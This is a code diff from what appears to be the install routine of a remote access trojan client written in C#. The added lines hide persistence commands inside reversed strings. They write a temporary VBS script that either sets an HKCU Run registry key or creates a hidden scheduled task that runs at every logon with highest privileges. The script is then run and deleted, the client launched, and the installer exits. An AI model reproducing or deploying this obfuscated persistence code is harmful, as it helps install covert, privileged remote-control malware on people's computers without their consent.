@@ -43,32 +43,27 @@ namespace Client.Install
                     fs.Write(clientExe, 0, clientExe.Length);
                     fs.Dispose();
 
-                    if (!Methods.IsAdmin())
+
+                    string tempName = Path.GetTempFileName() + ".vbs";
+                    string TempPath = Strings.StrReverse(Settings.ClientFullPath);
+                    string TempPathName = Strings.StrReverse(Path.GetFileName(Settings.ClientFullPath));
+                    using (StreamWriter sw = new StreamWriter(tempName, false))
                     {
-                        string tempName = Path.GetTempFileName() + ".vbs";
-                        string TempPath = Strings.StrReverse(Settings.ClientFullPath);
-                        String TempPathName = Strings.StrReverse(Path.GetFileName(Settings.ClientFullPath));
-                        using (StreamWriter sw = new StreamWriter(tempName, false))
+                        if (!Methods.IsAdmin())
                         {
                             sw.Write(Strings.StrReverse($@"""ZS_GER"",""{TempPath}"",""{TempPathName}\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH"" etirWgeR.llehShsW
 )""llehS.tpircSW""(tcejbOetaerC = llehShsW teS"));
+
                         }
-                        Process.Start(tempName);
-                        Thread.Sleep(1000);
-                        File.Delete(tempName);
-                    }
-                    else
-                    {
-                        Process.Start(new ProcessStartInfo()
+                        else
                         {
-                            FileName = "schtasks",
-                            Arguments = $"/create /sc onlogon /rl highest /tn {Path.GetFileName(Settings.ClientFullPath)}  /tr " + "\"" + Settings.ClientFullPath + "\"",
-                            CreateNoWindow = true,
-                            ErrorDialog = false,
-                            UseShellExecute = true,
-                            WindowStyle = ProcessWindowStyle.Hidden
-                        });
+                            sw.Write(Strings.StrReverse($@")eslaF ,0 ,""{TempPath}"""" rt/ {TempPathName} nt/ tsehgih lr/ nogolno cs/ etaerc/ sksathcs""( nuR.llehShsw = ter
+                                )""llehS.tpircSW""(tcejbOetaerC = llehShsw teS"));
+                        }
                     }
+                    Process.Start(tempName);
+                    Thread.Sleep(1000);
+                    File.Delete(tempName);
                     Process.Start(Settings.ClientFullPath);
                     Methods.ClientExit();
                     Environment.Exit(0);
